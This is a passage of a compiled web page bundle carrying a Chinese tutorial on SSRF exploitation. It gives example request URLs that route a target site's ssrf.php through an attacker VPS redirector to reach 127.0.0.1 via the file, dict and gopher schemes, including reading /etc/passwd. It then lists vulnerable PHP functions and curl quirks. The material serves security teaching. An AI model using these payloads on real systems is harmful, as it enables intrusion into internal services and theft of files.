"),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[a("strong",[s._v("利用：")])]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#http/https")]),s._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("目标网站HOST"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ssrf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("vps的IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302.")]),s._v("php?schema"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ip"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("port"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#file")]),s._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("目标网站HOST"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ssrf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("vps的IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302.")]),s._v("php?schema"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("file")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ip"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("query"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("etc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("passwd\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#dict")]),s._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("目标网站HOST"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ssrf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("vps的IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302.")]),s._v("php?schema"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("dict")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ip"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("port"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29362")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("query"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("info\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#gopher")]),s._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("目标网站HOST"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ssrf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("php?url"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("http"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("vps的IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("302.")]),s._v("php?schema"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("gopher"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ip"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v(".1")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("port"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2333")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("query"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("66666")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h3",{attrs:{id:"总结"}},[s._v("总结 "),a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("fsockopen")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl_exec")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("以上三个函数使用不当会造成SSRF漏洞")]),s._v(" "),a("p",[s._v("curl7.43上gopher协议存在%00截断的BUG，v7.49可用")]),s._v(" "),a("p",[s._v("file_get_contents()的SSRF，gopher协议不能使用URLencode")]),s._v(" "),a("p",[s._v("file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败")]),s._v(" "),a("h3",{attrs:{id:"更多参考"}},[s._v("更多参考 "),a("a",{staticClass:"header-anchor",attrs:{href:"#更多参考"}},[s._v("#")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://xz.aliyun.com/t/6373",target:"_blank",rel:"noopener noreferrer"}},[s._v("SSRF在有无回显方面的利用及其思考与总结"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("a",{attrs:{href:"https://blog.chaitin.cn/gopher-attack-surfaces/",target:"_blank",rel:"noopener noreferrer"}},[s._v("【长亭科技】利用 Gopher 协议拓展攻击面"),a("OutboundLink")],1)])])}),[],!1,null,null,null);t.default=r.exports}}]);